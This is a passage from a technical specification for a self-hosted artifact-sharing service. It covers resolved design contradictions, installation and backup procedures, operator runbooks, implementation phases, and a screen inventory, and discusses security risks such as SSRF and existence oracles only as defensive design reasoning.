authoritative. Concurrent commits therefore both succeed with distinct sequences and a
deterministic final `live_version_id` (last committer wins). Tested by T-POST-06 and T-POST-07.

**A7 — `sharectl panic` and grants.** §10.5 says panic "revokes every share link on the instance,
kills every recipient session"; it is silent on `share_grant`. Rule 1 argues for revoking grants
too. *Rules 1 and 2, in tension.* **Resolution:** panic does **not** revoke grants, and this is
the one place in this part where rule 1 was not followed literally. The reasoning: panic exists
for a leaked bearer credential (§10.5's two stated risks are both about links), a grant requires
an authenticated account on this instance and cannot be forwarded (§3.7), and revocation is
irreversible in the §5.11 sense — restoring does not re-open access, so a panicked grant would
silently break legitimate collaboration with no undo. Instead, the panic summary email
**enumerates every live grant** so the operator can revoke deliberately. Tested by T-OPS-06.

**A8 — the collection query contradicts its own prose.** §3.6 states `ref_count` is advisory and
that `NOT EXISTS` is authoritative, then writes a query whose `WHERE` includes
`f.ref_count <= 0`. A counter that has drifted **high** on an unreferenced file makes that file
permanently uncollectable — a slow leak the prose says cannot happen. *Rule 1.* **Resolution:**
the query stays exactly as written. Conservative is correct: a leak costs disk, and removing the
counter from the predicate would make a drifted-low counter on a **referenced** file rely on
`NOT EXISTS` alone, which is a much worse failure if the subquery is ever mis-joined. The remedy
is `sharectl recompute-refs`, plus a nightly log line counting rows where
`ref_count > 0 AND NOT EXISTS (…)` so the leak is visible rather than silent. Tested by T-VER-09
and T-OPS-07.

**A9 — `share_post_from_urls` versus "no SSRF surface at all".** §2.9 states flatly that Share
"makes no outbound request on behalf of published content — there is no proxying feature, so
there is no SSRF surface at all", and §1.6.1 rests part of the public-hostname argument on it.
§9.3's `share_post_from_urls` has the server fetch caller-supplied URLs, which is a
textbook SSRF surface reaching `169.254.169.254`, loopback Postgres and Redis, and `file://`.
This is the sharpest contradiction in the spec. *Rule 1, decisively.* **Resolution:** the server
never dereferences a caller-supplied URL. `share_post_from_urls` keeps its name and signature but
its implementation changes: it performs the declare, returns the signed upload URLs paired with
the caller's source URLs, and the **agent** fetches and uploads. §2.9's claim stays literally
true, and no allowlist, resolver pinning, or redirect policy has to exist — which is rule 3 as
well. Tested by T-MCP-05, which asserts zero outbound sockets from the API process.

**A10 — `allowFraming` and `csp` exist only in Part 6.** §6.6.6 describes both as post-time
artifact properties, but neither appears in §5.4's declare field table, §5.9's `PATCH` list,
§5.8's item shape, or §3.4's `artifact` table. *Rule 2.* **Resolution:** add
`allow_framing boolean NOT NULL DEFAULT false` and `csp text` to `artifact`, both settable at
declare and via `PATCH`, both present in the item shape. `allowFraming` is ignored with a
`framing_ignored_password_link` warning when the request arrives through a password-protected
link, per §6.6.6. Tested by T-SEC-14.

**A11 — warning codes have no catalogue.** Seven warning strings appear across the spec —
`shadowing_name` (§6.5.1), `no_entry_point` (§5.5), `ttl_with_live_links` (§8.5),
`archive_ratio_exceeded`'s advisory sibling, the §10.5 phishing heuristic, plus
`entry_path_not_found` and `framing_ignored_password_link` added above — with no stable list, no
shape, and no statement that they are part of the contract. `422 dotfile_rejected` (§6.4 step 7)
is likewise missing from §5.12's error table. *Rule 2.* **Resolution:** warnings are
`{code, message, detail}` objects with the same stability guarantee as error codes, catalogued in
§5.12 alongside the errors, and `dotfile_rejected` is added to that table. The phishing warning's
code is `possible_credential_form`. Tested by T-POST-14, T-SEC-02, T-SEC-15, T-SEC-30.

**A12 — can you purge something already in the trash?** §5.11 presents `?purge=true` as an
alternative to trashing; §8.4 and §4.6.1 describe `artifacts:delete` as "purge from trash".
*Rule 2.* **Resolution:** one code path. `DELETE /api/v1/artifacts/{name}?purge=true` works
whether the artifact is live or trashed, and is the only permanent-deletion route. Tested by
T-TRASH-06 and T-PRIV-08.

**A13 — what is `SHARE_MAX_SHARE_TTL` measured from?** §7.3 caps `ttl` at it; §7.4 says extending
adds to the current expiry. Extending repeatedly by small amounts could otherwise carry a link
past the maximum indefinitely, defeating the point of P4's expiry-as-control argument in §1.6.4.
*Rule 1.* **Resolution:** the cap is on total lifetime — `expires_at - created_at` may never
exceed `SHARE_MAX_SHARE_TTL`. An extension that would breach it is `422 ttl_too_long`. A link
that has reached the cap must be replaced, which is the correct outcome: a new link, a new audit
record, a new notification. Tested by T-SHARE-12.

**A14 — `/internal/authorize` returning `401` is an existence oracle.** §2.4.1's response table
includes `401` meaning "recipient must enter a password", but `forward_auth` only runs for
root-space and user-space artifact paths (§2.4 routes `/s/*` straight to the API). A `401` on
`/postcal` would tell an unauthenticated stranger that `postcal` exists and is link-shared with a
password — a direct P1 violation. *Rule 1.* **Resolution:** `/internal/authorize` returns only
`200`, `404`, `429`, or `503`. The `401` row is removed from §2.4.1; password gates arise solely
inside the `/s/*` handler, which does not use `forward_auth`. Tested by T-SERVE-11 and
T-SHARE-01, whose matrix asserts `404` — never `401` — for every non-recipient actor.

**A15 — recipient cookie names can collide.** §4.7 derives the cookie name from the token's first
8 characters and §3.7 stores the same 8 characters as `display_prefix`. Two live links sharing a
prefix would produce two cookies with the same name at overlapping paths. The probability is
negligible (58⁸ ≈ 1.3 × 10¹⁴) but the failure is silent cross-link cookie confusion. *Rule 1.*
**Resolution:** link creation retries token generation while the 8-character prefix already
exists among that instance's live links, making collision impossible rather than unlikely; the
session row's `share_link_id` check remains as the second layer. Tested by T-SEC-07 and
T-SHARE-06.

**A16 — the view hash's inputs are under-specified.** §10.6 requires that "the same visitor across
two artifacts produces unlinkable hashes", which is only true if the artifact is an input to the
hash; §3.7's `recipient_session.ip_hash` is described as "a salted daily hash" with no such
input. *Rule 1.* **Resolution:** view hashes are
`HMAC(key = view_salt ‖ utc_date, msg = artifact_id ‖ client_ip)`; recipient-session hashes are
`HMAC(key = view_salt ‖ utc_date, msg = share_link_id ‖ client_ip)`. Both are unlinkable across
targets and unrecomputable after the day rolls over. Tested by T-PRIV-06.

**A17 — API paths cannot express a name containing a slash.** §5.3 permits `q3/market-report` and
§5.8 addresses artifacts as `/api/v1/artifacts/{name}`, so `/api/v1/artifacts/q3/market-report/links`
is ambiguous between artifact `q3` with sub-resource `market-report/links` and artifact
`q3/market-report` with sub-resource `links`. §6.5.1's longest-prefix rule solves this for
serving but not for the API, where the sub-resource is a suffix rather than the remainder.
*Rules 2 and 3.* **Resolution:** slashes in names are percent-encoded in API path segments —
`/api/v1/artifacts/q3%2Fmarket-report/links` — decoded exactly once, with any residual `%`
rejected, matching §6.4's single-decode discipline. Every `{name}` endpoint's test set is
parameterised over a slashed name so the encoding is exercised everywhere rather than on the one
endpoint someone remembered. Tested across T-PRIV-07, T-POST-23, and T-SHARE-14.

**A18 — Part 16 does not exist and the phase count disagrees with the inventory.**
`inventory.md` assigns screens to phases 1–3; §1.11 names Part 16 as the phasing document; the
brief for this part specifies four phases. *Rule 2.* **Resolution:** §14.21 infers a fourth
phase covering the screenless operational work, states the inference explicitly, and declares
that Part 16 governs once written. Recorded as `D-14-PHASE`.

**A19 — a minor one, recorded so it is not rediscovered.** §2.4's Caddyfile strips
`X-Share-File`, `X-Share-Artifact`, and `X-Share-Actor` from client requests, but `copy_headers`
lists eight `X-Share-*` headers, five of which are never stripped on the way in
(`X-Share-Content-Type`, `X-Share-Cache-Control`, `X-Share-Disposition`, `X-Share-CSP`,
`X-Share-Frame-Options`, `X-Share-Version`). A client sending `X-Share-CSP:` on an artifact
request could reach the API. It cannot change the outcome, because the API constructs its own
response headers and Caddy re-emits from the **response**, not the request — but relying on that
is fragile. *Rule 1.* **Resolution:** strip **all** `X-Share-*` request headers at the edge with
`request_header -X-Share-*`, not an enumerated subset. Tested by T-SEC-05, which sends every one
of the eight.

---

# Part 15 — Installation and Operations

## 15.1 Target environment

| | |
| --- | --- |
| Host | One Linode VM, 4 GB / 2 vCPU minimum, Ubuntu 24.04 LTS |
| Storage | Root disk for OS and Postgres; a separate Block Storage volume at `/var/lib/share` |
| Filesystem | ext4, `noatime`. `files/` and `tmp/` must share it — atomic rename depends on it |
| Network | Public IPv4 and IPv6. One DNS A/AAAA pair |
| Mail | An SMTP relay the instance can authenticate to |

**Encryption at rest is a prerequisite.** The Block Storage volume is LUKS-encrypted. Artifact
bytes must be servable and therefore cannot be application-encrypted (§1.6.4), so disk
encryption is the only protection against provider or physical access. The installer refuses to
proceed on an unencrypted volume unless `--i-accept-unencrypted-storage` is passed.

**Tailscale is not required and not used by the application.** If the operator keeps it on the
box for SSH, that is an administration choice with no bearing on how Share works.

## 15.2 Install

An idempotent Ansible playbook (or equivalent shell script) that:

1. Creates the `share` system user and the `share-read` group; adds `caddy` to `share-read`.
2. Installs Postgres 16, Redis 7, Caddy 2, Python 3.12.
3. Creates the LUKS volume, filesystem, and the directory tree of §3.5 with correct ownership
   and modes (`files/` 0750 `share:share-read`, `tmp/` 0700 `share:share`).
4. Installs the application into `/opt/share` with a virtualenv, plus `sharectl` on the path.
5. Writes systemd units for `share-api` and `share-worker` with `LoadCredential=` entries for
   the three secrets in §2.7.
6. Generates those secrets if absent, `0400 root:root` under `/etc/share/credentials/`.
7. Runs migrations, then `sharectl bootstrap`.
8. Writes the Caddyfile of §2.4 with the operator's hostname substituted.
9. Enables and starts everything; waits for `/internal/ready` to go green.
10. Prints the passkey-registration URL and the three next steps.

Re-running upgrades the application, runs migrations, and reloads services without touching
data.

## 15.3 Bootstrap

```
sharectl bootstrap --email you@c52.com --handle robert
```

Creates the root user, prints a registration URL valid 15 minutes. Registering the first
passkey completes it and prints one recovery code and one API token, each shown once.

Refuses to run if any user exists.

Follow-on:

```
sharectl invite sarah@… --handle sarah
sharectl set-quota usr_… 1TB
sharectl set-setting usr_… notifyOnShare true
```

## 15.4 Backup

| Item | Method | Frequency | Retention |
| --- | --- | --- | --- |
| Postgres | `pg_dump -Fc`, encrypted with `age` | Nightly 02:00 | 30 daily, 12 monthly |
| Files | `rsync --link-dest` hardlink snapshots to a second volume or remote | Nightly 02:20 | 14 daily |
| `/etc/share/share.env` | With the database dump | Nightly | 30 |
| Caddy's certificate store | Weekly with the config backup | Weekly | 4 |
| `/etc/share/credentials/` | **Manual, out of band** | On change | Forever |

Hardlink snapshots mean fourteen nightly copies of a 300 GB store cost 300 GB plus the deltas,
because files are immutable and unchanged ones are hardlinks.

Off-host copies go to a second Linode volume in another region or to the operator's own
machine. Nothing about the backup path depends on the application being up.

### 15.4.1 The secrets

`secret_key` signs cookies and upload URLs; losing it invalidates sessions and in-flight
uploads, which is recoverable. `view_salt` losing it costs nothing but view-count continuity.
Neither can decrypt anything, because **there is nothing encrypted in the database**: no
passwords, no API secrets, no third-party credentials. A stolen backup yields no usable
credential. That is a direct consequence of dropping passwords and the API-proxying feature,
and it is worth knowing when deciding how carefully to guard the archive.

### 15.4.2 Restore drill

Run once after install and once a year:

```
sharectl restore --db /backups/share-2026-08-24.dump.age --files /backups/files/2026-08-24/
sharectl verify-integrity
```

`verify-integrity` walks `version_file` rows, confirms every referenced file exists on disk, and
re-hashes a sample to confirm the bytes match their names. It is the only reliable way to know a
restore is complete. The worker also runs it monthly against a 1,000-row sample, with results on
the status screen.

## 15.5 Monitoring

Minimal by design — one operator, no rotation.

| Signal | Source | Alert |
| --- | --- | --- |
| `/internal/ready` red for 2 minutes | External check from the operator's own machine | Email |
| Disk over 85% | Worker | Email daily |
| Backup did not complete | Worker checks for a marker file | Email |
| Postgres connection failures | Application counter | Email at >10/min |
| Redis unavailable | Application counter | Email once, then hourly |
| Certificate expiring in under 10 days | Caddy metrics | Email |
| Anomaly signals of §10.4 | Worker | Email |

Logs go to the journal as structured JSON, one line per request with request ID, method, path,
status, duration, actor, and byte counts. `journalctl -u share-api -f | jq` is the supported
debugging path. Retention 14 days, except the audit log, which is in Postgres and permanent.

No Prometheus, no Grafana, no tracing. `/internal/metrics` exposes a Prometheus text endpoint on
loopback, disabled by default, for an operator who later wants it.

## 15.6 Routine calendar

| Cadence | Task |
| --- | --- |
| Daily (automatic) | Backups, collection, trash emptying, expiry sweeps, view rollups, staleness |
| Weekly | Skim the audit log's `link.create` entries — confirm nothing unexpected became reachable |
| Monthly | Review live share links and their expiries; check the integrity sample report |
| Quarterly | OS and dependency updates; review API tokens and revoke unused ones |
| Annually | Rotate `secret_key` (invalidates sessions and in-flight uploads — schedule it); rotate `view_salt`; full restore drill; confirm at least two passkeys still work |
| On a person leaving | `sharectl disable-user <email>` — revokes their sessions, passkeys, and tokens; their space and artifacts remain |

The annual "confirm two passkeys still work" item is not busywork. A second passkey that was
registered once and never tested is a second passkey you do not actually have.

## 15.7 `sharectl`

| Command | Purpose |
| --- | --- |
| `bootstrap` | First-run root user creation |
| `invite <email> --handle <h>` | Create a user |
| `disable-user <email>` | Revoke all credentials, keep the space |
| `grant-session --email <e> --minutes 30` | Recovery layer 3 (§4.5) |
| `set-quota <user> <size>` | |
| `set-setting <user> <key> <value>` | |
| `list-links` | Every live share link with artifact, expiry, and password state |
| `panic` | Revoke every share link and recipient session; email a summary (§10.5) |
| `revoke-token <id>` / `revoke-user-tokens <email>` | |
| `recompute-quota [user]` | Rebuild denormalised storage counters |
| `recompute-refs` | Rebuild file reference counts from `version_file` |
| `verify-integrity [--sample N]` | Confirm every referenced file exists and hashes correctly |
| `collect --dry-run` | Show what the next collection pass would delete |
| `empty-trash [--older-than N]` | Force trash emptying |
| `audit-seal` / `audit-verify` | Optional daily digests (§10.7) |
| `restore` | Database and file restore |
| `regenerate-recovery-code <email>` | |

`sharectl` talks to Postgres directly, requires root or the `share` user, and is not exposed
over the network.

## 15.8 Growth paths

| Symptom | Response |
| --- | --- |
| File volume filling | Grow the Block Storage volume; ext4 online resize, no downtime |
| Slow for distant recipients | Put a CDN in front, origin-locked by a shared header Caddy requires. Note that everything is `Cache-Control: private`, so a CDN helps with TLS termination and routing, not caching |
| Postgres CPU-bound on search | Add a second trigram index configuration, or accept it — 10,000 artifacts is nothing |
| Many concurrent large uploads | Raise Gunicorn workers; uploads are I/O-bound |
| Wanting a second region | Not supported. This is where the architecture would have to change, and the spec says so rather than pretending otherwise |

## 15.9 Runbook — the five things that will actually happen

**1. A post fails with `files_missing`.**
An upload silently failed. `GET /api/v1/uploads/{id}` returns fresh signed URLs; re-running
`share post` against the same name re-declares and uploads only what is missing. Nothing is at
risk.

**2. Something is reachable that should not be.**
`sharectl list-links` to see everything live, `share unlink <id>` for one, `sharectl panic` for
all. Recipient sessions die immediately. Then read the audit log for `link.create` on that
artifact to learn which token did it, and revoke that token.

**3. An agent deleted a pile of things.**
Everything it deleted is in the trash for 30 days. `/~/trash`, filter by the token, multi-select,
restore. Then check whether the token should have had `artifacts:delete` — by default it did
not, so nothing is permanently gone.

**4. The disk filled.**
Serving continues; posting returns `507`. `sharectl collect --dry-run` shows collectable bytes.
Then `sharectl empty-trash --older-than 0` if the trash is large, or grow the volume. **Never
delete files from `files/` by hand** — the database would reference missing bytes and
`verify-integrity` would light up.

**5. All the passkeys are gone.**
Recovery code first (§4.5 layer 2). If that is also gone,
`sharectl grant-session --email you@c52.com` from an SSH session, then register a new passkey
immediately. This is why SSH access to the box is worth protecting as carefully as the
passkeys themselves.

---

# Part 16 — Phasing and Definition of Done

## 16.1 How to sequence this

Four phases. The instance is genuinely usable at the end of Phase 1 — an agent can post, the
owner can open it — and each later phase adds capability without reworking what came before.

An implementing agent completes a phase, runs its exit tests, and only then starts the next.
Phases 2 and 3 can be built in parallel by separate agents. Phase 4 depends on both.

This part is authoritative for phase membership; where `inventory.md`'s phase column disagrees,
this wins.

## 16.2 Phase 1 — Post and open

**Goal:** an agent posts a directory and the owner opens the URL from a phone.

| Deliverable | Spec |
| --- | --- |
| Schema, migrations, `sharectl bootstrap` | Part 3, §15.3 |
| Passkey registration and sign-in, sessions, recovery code | §4.2–4.5 |
| API tokens, scopes, the `require(scope)` dependency, device-code flow | §4.6 |
| Three-phase post, bundle post, name validation, path normalisation, file store | Part 5, §6.4 |
| `/internal/authorize`, `can_view`, resolution, serving, the Caddyfile | Part 2, §6.5–6.6 |
| Trash and restore | §8.4 |
| Audit log for auth, post, and trash | §10.7 |
| Remote MCP endpoint with the post/list/get/read/delete tools | §9.2–9.3 |
| CLI: `post`, `ls`, `get`, `open`, `rm`, `restore`, `login`, `whoami`, `doctor` | §9.4 |
| Screens 11.1, 11.3, 11.5, 11.6, 11.7, 11.8, 11.15, 11.18, 11.19, 11.26, 11.27 | Part 11 |
| Install playbook, backup job, `sharectl` basics | Part 15 |

**Exit criteria**

- `share post ./x` returns a working URL in under 5 seconds for a 40-file artifact.
- A passkey registered in 1Password signs in on a second device with no password anywhere.
- T-PRIV-01, T-PRIV-02, T-PRIV-05, T-PRIV-07, T-PRIV-08 pass.
- The whole T-POST and T-AUTH suites pass.
- T-SEC-07 passes — no credential class crosses into another.
- A restore drill succeeds and `verify-integrity` reports zero missing files.

**Deliberately deferred:** all sharing, versions UI, viewer chrome, search, grants, users.
Phase 1 has exactly one visibility state — private — which makes the access model trivially
testable before any sharing exists to complicate it.

## 16.3 Phase 2 — Sharing and viewing

**Goal:** the owner hands a client a link that works and dies on schedule.

| Deliverable | Spec |
| --- | --- |
| Share links: create, password, expiry, revoke, extend | §7.3–7.5 |
| Recipient sessions and the `/s/{token}` surface | §4.7, §2.5.2 |
| Recipient-facing pages R1–R7 | §11 R-series, §12.7 |
| Expiry sweep, inline expiry check, expiry notifications | §7.5, §10.8 |
| Versions: list, restore, retention, preview | §8.2–8.3 |
| Artifact TTL | §8.5 |
| The viewer: page, document, image, video, bundle, with Range serving | §11.9, §6.6.4 |
| Search and the command palette | §8.7 |
| Browser upload | §11.17 |
| Screens 11.2, 11.9–11.13, 11.16, 11.17, 11.21 | Part 11 |
| Design system and all product copy | Parts 12, 13 |

**Exit criteria**

- A password-protected link works end to end from a phone on cellular data, with JavaScript
  disabled.
- T-PRIV-03, T-PRIV-04, T-PRIV-06, T-PRIV-09 pass.
- The full T-SHARE matrix passes — five principals × nine artifact states.
- T-EXP-02 passes: a link is dead the second after expiry, before the sweep runs.
- A 2 GB video seeks correctly through a share link.
- Every screen renders in both themes at 375 px and 1440 px.

## 16.4 Phase 3 — More than one person

**Goal:** a second user exists and sees only what was shared with them.

| Deliverable | Spec |
| --- | --- |
| Invites, user creation, handles, `~handle` namespaces | §4.8, §6.2 |
| Grants and "shared with me" | §7.7 |
| Save a copy | §5.10, §7.7.1 |
| Staleness view and storage screen | §8.6, §11.24, §11.25 |
| Audit log screen and export | §10.7, §11.23 |
| Security overview | §11.20 |
| Screens 11.4, 11.14, 11.20, 11.22–11.25, 11.28 | Part 11 |

**Exit criteria**

- A second user signs in and can prove, by test, that they cannot see, list, search, guess, or
  reach anything of the root user's except what was granted.
- T-PRIV-07 passes against a real second user rather than a fixture.
- Revoking a grant takes effect on the grantee's next request.
- A grantee's saved copy survives the original being purged.

## 16.5 Phase 4 — Operational hardening

**Goal:** it can be trusted with client material and left alone.

| Deliverable | Spec |
| --- | --- |
| Anomaly detection and the full notification set | §10.4, §10.8 |
| Rate limiting on every bucket | §10.2 |
| `sharectl panic`, integrity sampling, audit sealing | §10.5, §15.7 |
| View counting and the activity feed | §10.6, §8.8 |
| Monitoring, alerting, restore drill automation | §15.5 |
| Instance status screen | §11.28 |

**Exit criteria**

- Every bucket in §10.2 has a passing test, verified by the bucket-registry coverage gate.
- An anomaly fires an email within 15 minutes of tripping.
- `sharectl panic` kills every link and session and is verified against a live recipient.
- The full acceptance suite in Part 14 passes with no skips.
- The manual checklist in §14 is signed off.

## 16.6 Definition of done, per feature

Applied before any task is marked complete:

1. **Behaviour matches the spec section**, including every error and warning code in its table.
2. **Tests exist and pass** at the levels the feature warrants — unit for pure logic,
   integration against real Postgres and Redis, end-to-end through Caddy for anything touching
   serving.
3. **The three negative cases are tested** for every endpoint: permission denial, limit breach,
   malformed input. Enforced reflectively over the route table (T-SEC-00).
4. **Audit events fire** for every action in §10.7 the feature covers.
5. **No secret appears** in any log line, error body, or API response.
6. **The OpenAPI document is regenerated** and its examples execute against a test instance.
7. **The docs in Part 12 are updated**, including any new error or warning code.
8. **Both the MCP tools and the CLI cover it**, or a note records why not — §9.1 requires
   parity, and parity that drifts silently is worse than parity never claimed.
9. **A rollback path exists**: the migration is reversible, or its irreversibility is documented
   in the migration file.

## 16.7 Where the weight is

Relative sizing, not a schedule.

| Phase | Effort | Riskiest part |
| --- | --- | --- |
| 1 | 35% | The `forward_auth` contract, and getting WebAuthn right the first time |
| 2 | 35% | Recipient session semantics and revocation; the viewer across five artifact kinds |
| 3 | 15% | Nothing especially risky — mostly mechanical once spaces are enforced |
| 4 | 15% | Anomaly thresholds that are useful rather than noisy |

Two places deserve disproportionate care: **§6.5, the `authorize` function and `can_view`** —
four lines that are the entire access model, and the only place a mistake becomes a data leak —
and **§4.7, credential-class confinement**, because a recipient session that leaks into the API
would turn a shared link into an account.

Everything else is recoverable from. Those two are not.

## 16.8 What is deliberately not on the roadmap

- Multi-region or high availability (§1.4 N5).
- Any server-side execution of published content, build steps, or application runtime (N1).
- Embedded data storage for published pages, or API proxying with injected credentials (N2).
  These were in an earlier draft, were the largest security surface in the system, and are cut.
- Teams, roles, or permission matrices (N3). Sharing is per-artifact; there is nothing else.
- Public sign-up (N4).
- Full-text search inside artifacts (N6, P5).
- Custom domains, subdomains, or any hostname beyond `share.c52.com`.
- Content-derived anything: no generated titles, summaries, thumbnails, or classifications.
- Permanent share links. Not a phase, not a flag, not a future consideration.
- Anonymous posting. This is the thing the instance exists to not have.

---

# Appendix A — Shared Inventory: canonical numbering for Parts 11, 12, 13

Do not renumber. Parts 11 (screens), 12 (copy), and 13 (design system) cross-reference each
other by these numbers.

## Dashboard screens (all under `/~/`)

| # | Screen | Route | Phase |
| --- | --- | --- | --- |
| 11.1 | Sign in — passkey | `/~/signin` | 1 |
| 11.2 | Sign in — recovery code | `/~/signin/recovery` | 2 |
| 11.3 | Passkey registration / add a passkey | `/~/security/passkeys/new` | 1 |
| 11.4 | Invite acceptance | `/~/invite/{token}` | 3 |
| 11.5 | Home — artifact list | `/~/artifacts` | 1 |
| 11.6 | Home — empty state and first-run checklist | `/~/artifacts` | 1 |
| 11.7 | Artifact detail — overview and activity | `/~/artifacts/{name}` | 1 |
| 11.8 | Artifact detail — files | `/~/artifacts/{name}/files` | 1 |
| 11.9 | Artifact viewer — page, document, image, video, bundle | `/~/artifacts/{name}/view` | 2 |
| 11.10 | Artifact detail — versions | `/~/artifacts/{name}/versions` | 2 |
| 11.11 | Version preview and compare | `/~/artifacts/{name}/versions/{id}` | 2 |
| 11.12 | Sharing panel — links and grants | `/~/artifacts/{name}/share` | 2 |
| 11.13 | **Create share link dialog** | `/~/artifacts/{name}/share/new` | 2 |
| 11.14 | Shared with me | `/~/shared` | 3 |
| 11.15 | Trash | `/~/trash` | 1 |
| 11.16 | Search and command palette | `/~/search`, ⌘K anywhere | 2 |
| 11.17 | Upload from the browser | `/~/upload` | 2 |
| 11.18 | API tokens | `/~/tokens` | 1 |
| 11.19 | Passkeys and sessions | `/~/security` | 1 |
| 11.20 | Security overview | `/~/security/overview` | 3 |
| 11.21 | Settings | `/~/settings` | 2 |
| 11.22 | Users and invites (root only) | `/~/users` | 3 |
| 11.23 | Audit log | `/~/audit` | 3 |
| 11.24 | Staleness — things you have not opened | `/~/stale` | 3 |
| 11.25 | Storage and quota | `/~/storage` | 3 |
| 11.26 | Device authorization | `/~/authorize` | 1 |
| 11.27 | Help and agent setup | `/~/help`, `/~/help/agents` | 1 |
| 11.28 | Instance status | `/~/status` | 3 |

## Recipient-facing and error pages (served by the API, no dashboard chrome)

| # | Page | Status | Notes |
| --- | --- | --- | --- |
| R1 | Share-link password gate | 401 | Must work with JavaScript disabled |
| R2 | Share-link landing for non-HTML artifacts | 200 | Minimal chrome: title if set, view, download |
| R3 | Link expired or revoked | 410 | Only on `/s/{token}`; reveals nothing about the artifact |
| R4 | Not found | 404 | The universal response for anything inaccessible |
| R5 | Rate limited | 429 | |
| R6 | Maintenance | 503 | Static, served by Caddy when the API is down |
| R7 | Artifact file listing | 200 | A bundle with no entry point (§6.6.2) |

## Part 12 copy sections

| § | Contents |
| --- | --- |
| 12.1 | Voice and tone |
| 12.2 | Canonical terminology and tooltip definitions |
| 12.3 | First-run checklist copy |
| 12.4 | In-app documentation pages |
| 12.5 | UI microcopy, per screen 11.1–11.28 |
| 12.6 | Warning and advisory catalogue |
| 12.7 | Recipient-facing page copy (R1–R7) |
| 12.8 | Error message catalogue — every code in Parts 4–10 |
| 12.9 | Email templates |
| 12.10 | FAQ |
